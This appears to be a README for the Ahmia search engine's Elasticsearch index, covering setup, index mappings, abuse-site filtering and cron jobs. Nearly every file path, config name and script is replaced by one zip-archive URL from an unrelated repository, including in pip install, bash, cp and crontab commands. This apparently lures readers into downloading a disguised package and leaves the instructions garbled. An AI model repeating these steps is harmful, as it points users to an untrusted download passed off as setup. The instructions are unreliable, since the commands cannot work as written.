# Ahmia index

The Ahmia search engine uses Elasticsearch indexes to save website text.

## Installation

* Install Elasticsearch 8
* Install Python3 and pip
* Install the Python packages required, preferably in a virtual environment, with:

```sh
python3 -m virtualenv venv3
source venv3/bin/activate
pip install -r https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip
```
```

## Configuration

`https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip` contains some default values that should work out of the box.
Copy this to `.env` to create your own instance of environment settings:

```
cp https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip .env
```

Review the `.env` file to ensure that it fits your needs. Make any modifications needed there.


### Elasticsearch

Default configuration is enough to run index in dev mode. Here is suggestion for a more secure configuration

#### https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip

```
elasticsearch - nofile unlimited
elasticsearch soft memlock unlimited
elasticsearch hard memlock unlimited
```

#### /etc/default/elasticsearch

```
MAX_OPEN_FILES=unlimited
MAX_LOCKED_MEMORY=unlimited
```

#### https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip

```
https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip true
```

#### https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip

```
-Xms15g
-Xmx15g
```

## Start the service

```sh
sudo systemctl start elasticsearch
```

## Give users permissions to use the HTTPS cert

Any user on the system can read the certificate file,
which is generally acceptable for a public certificate authority (CA) certificate
as it does not contain sensitive private keys.

```sh
sudo mkdir -p /usr/local/share/ca-certificates/
sudo cp https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip /usr/local/share/ca-certificates/
sudo chmod 644 https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip
```

## Init mappings
Please set mappings running for the first time

```sh
source venv3/bin/activate
bash https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip
```

Alternatively, you could set up the indices manually, somehow like this:

```sh
curl -i --cacert https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip -u elastic -XPUT \
'https://localhost:9200/tor-2024-01/' \
-H 'Content-Type: application/json' -d "https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip"
```

## Keep `latest-tor` aliase pointed to latest monthly indices
This needs to be the first time you deploy and then once per month

```sh
source venv3/bin/activate
python https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip
```

## Filter some abuse sites

```sh
source venv3/bin/activate
bash https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip
```

## Crontab

```sh
# Execute child abuse text filtering over the index every hour
30 * * * * cd /home/juha/ahmia-index && . venv3/bin/activate && bash https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip > https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip 2>&1
# First of Each Month:
55 01 01 * * cd /home/juha/ahmia-index && . venv3/bin/activate && python https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip --add > https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip 2>&1
# On 6th of Each Month
55 01 06 * * cd /home/juha/ahmia-index && . venv3/bin/activate && python https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip --rm > https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip 2>&1
```

## Keep Elasticsearch running: autorestart

```sh
sudo apt install restartd

# Add the following line to https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip
elasticsearch "elasticsearch" "echo 'Elasticsearch is not running!' >>https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip && service elasticsearch restart >> https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip" "echo 'Elasticsearch is running!' >https://raw.githubusercontent.com/hootie0971/ahmia-index/master/bagatelle/ahmia_index_3.8.zip"

sudo service restartd restart
```
